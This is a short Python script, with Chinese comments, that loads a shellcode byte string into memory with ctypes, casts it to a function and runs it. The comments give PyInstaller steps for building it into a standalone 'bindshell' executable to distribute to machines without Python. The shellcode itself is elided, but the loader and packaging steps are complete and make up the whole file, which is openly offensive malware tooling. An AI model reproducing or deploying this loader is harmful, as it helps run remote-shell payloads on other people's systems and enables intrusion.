from ctypes import *


shellcode=("\xfc\xe8......\x53\xff\xd5");

memoryWithShell=create_string_buffer(shellcode,len(shellcode))
shell=cast(memoryWithShell,CFUNCTYPE(c_void_p))
shell()

#可以通过Pyinstaller http://www.pyinstaller.org/ 编译软件提高它，
#将Python脚本编译为独立的可执行程序，
#将其分发给没有安装python解释器的系统使用

# 下载
# cd pyinstaller-1.5.1
# python.exe Configure.py #脚本绑定Pyinstaller 很重要
#python.exe Makespec.py --onefile
#python.exe Build.py bindshell\ bindshell.spec
